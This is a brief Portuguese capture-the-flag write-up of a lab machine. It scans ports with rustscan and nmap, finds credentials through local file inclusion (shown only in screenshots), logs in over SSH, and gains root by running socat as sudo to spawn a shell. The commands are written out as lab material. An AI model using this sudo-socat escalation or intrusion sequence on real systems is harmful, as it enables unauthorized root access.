# LFI Inclusion

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.165.110
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c29d19a7-1039-47bf-9814-fd5b684d8f50)

![image](https://github.com/lufffe/Writeups/assets/90646635/35bc71c8-cbc1-4967-b544-de5b20bd6f99)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.165.110
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d8837077-52ec-490d-8d6a-a57fb32b26ff)

* ### Verificando o Http.
![image](https://github.com/lufffe/Writeups/assets/90646635/bce7c911-f7c6-49d2-9af1-056471f8c511)

* ### Identificando um LFI e um usuario e senha.
![image](https://github.com/lufffe/Writeups/assets/90646635/613d82a9-ad5c-44ee-b9e1-00720ea38038)

* ### Acessando via SSH.
```bash
ssh falconfeast@10.10.165.110
```
![image](https://github.com/lufffe/Writeups/assets/90646635/888e8181-1397-4e21-bc32-5d0f144fe680)

* ### Flag User.
```bash
cat user.txt 
```

* ### Vericando como escalar previlégio do usuário.
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e4f667a5-7491-4906-b0db-47e99e23f428)

![image](https://github.com/lufffe/Writeups/assets/90646635/4a533393-3b28-40b9-9925-85b08e2bf319)

* ### Payload.
```bash
sudo /usr/bin/socat stdin exec:/bin/sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5b3502a8-dcfd-4221-b899-0ee6d585abc7)

* ### Flag Root.
```bash
cat /root/root.txt
```
